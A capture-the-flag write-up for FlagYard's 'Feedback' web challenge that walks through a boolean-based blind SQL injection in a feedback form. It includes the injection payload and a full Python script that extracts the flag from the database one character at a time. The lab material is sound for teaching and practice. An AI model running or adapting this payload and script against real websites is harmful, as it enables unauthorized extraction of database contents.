# Feedback

**Challenge Name**: Feedback  
**Category**: Web  
**Points**: 120  
**Platform**: FlagYard

## Challenge Overview:
The **Feedback** challenge involves exploiting a **SQL Injection** vulnerability in a web application’s feedback submission form. The goal is to extract a flag hidden in the database by using **Boolean-based blind SQL Injection** to reveal each character of the flag, one at a time.

### Exploitation Process:

#### 1. **Identifying the Vulnerability**:
The challenge provides an input field where users can submit feedback. By inspecting the request headers and body, I identified that the feedback form used SQL queries to store and retrieve feedback data. The **SQL Injection** vulnerability allowed me to inject malicious SQL queries to interact with the backend database.

#### 2. **Crafting the SQL Injection Payload**:
To retrieve the flag, I crafted a **SQL Injection** payload that would:
- Use a **substring function** to pull one character of the flag at a time.
- Use a **conditional query** to check if the guessed character matches the one stored in the database.

The payload used the following logic:
```sql
ana'||(select CASE WHEN substr((select flag from flag),{position},1)='{character}' THEN 1 ELSE 1/0 END)||'s
```
Where `{position}` represents the character position in the flag (ranging from 1 to 64), and `{character}` is a character from ASCII 32 to 126.

#### 3. **Automating the SQL Injection**:
The script automates the entire process of injecting the payload and checking the response. It:
- Loops over each position of the flag.
- Loops over possible characters (from ASCII 32 to 126) to guess each character of the flag.
- Sends the payload and checks if the response contains the flag at that position.

#### 4. **Receiving Feedback**:
The feedback submission response was checked by the script. If the injection was successful, the server would return a valid response (not an error message like "Something went wrong"). If the character matched, the script would append the character to the flag string and continue to the next character.

#### 5. **Displaying the Flag**:
After the script successfully identifies all characters of the flag, it prints out the complete flag.

---

## Code:

```python
import requests
import re
import itertools
import time
import sys
import threading


print('''  
               #########               
            ###############            
         #####################         
      ###########################      
   ##############     ##############   
 #############           ############# 
###########                 ########### 
########                       ########
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
#######                         #######
########                       ########
###########                 ###########
 #############           ############# 
   ##############     ##############   
      ###########################      
         #####################         
            ###############            
               #########               

Welcome To FlagYard Feedback CTF Tool    
''')

print("Please enter the URL:")
url = input("# ")
host = re.sub(r'http://|/$', '', url)
print("=> URL : ", url)
print("[+] Please Enter Your Cookie Session")
token = input("# ")
print("=> Session : ", token)
print("[+] Do you want to see the program trying to display flag? (y/n) ")
debug = input("# ")
while debug not in ["y", "n"]:
    print("[+] Please enter 'y' or 'n'")
    debug = input("# ")

def loading_animation():
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    while getattr(threading.current_thread(), "do_run", True):
        sys.stdout.write(f'\rNow we are getting the flag, please wait {next(spinner)}')
        sys.stdout.flush()
        time.sleep(0.1)

if debug == "n":
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()


def dosqli(url, data):
    headers = {
    "Host": host,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Connection": "close",
    "Cookie": f"session={token}"
    }
    response = requests.post(url, headers=headers, data=data)
    if "Something went wrong" in response.text:
        return "Wrong"
    else:
        return "Correct"


flag = []
for i in range(1, 65):
    for j in range(32, 126):
        payload = f"ana'||(select CASE WHEN substr((select flag from flag),{str(i)},1)='{chr(j)}' THEN 1 ELSE 1/0 END)||'s"
        data = {"feedback": payload}
        out = dosqli(url, data)
        if out == "Correct":
            flag.append(chr(j))
            sys.stdout.write(chr(j))
            sys.stdout.flush()
            break

if debug == "n":
    loading_thread.do_run = False
    loading_thread.join()

print(f"\nFinal flag: {''.join(flag)}")
print("Done")
```

---

### Conclusion:
The **Feedback** challenge required exploiting an **SQL Injection** vulnerability in the web application to extract the flag. By automating the process of sending **Boolean-based SQL queries**, I was able to progressively guess the characters of the flag and ultimately retrieve it. This challenge is a great example of using SQL injection techniques in a real-world application, emphasizing the importance of securing user inputs in web applications.
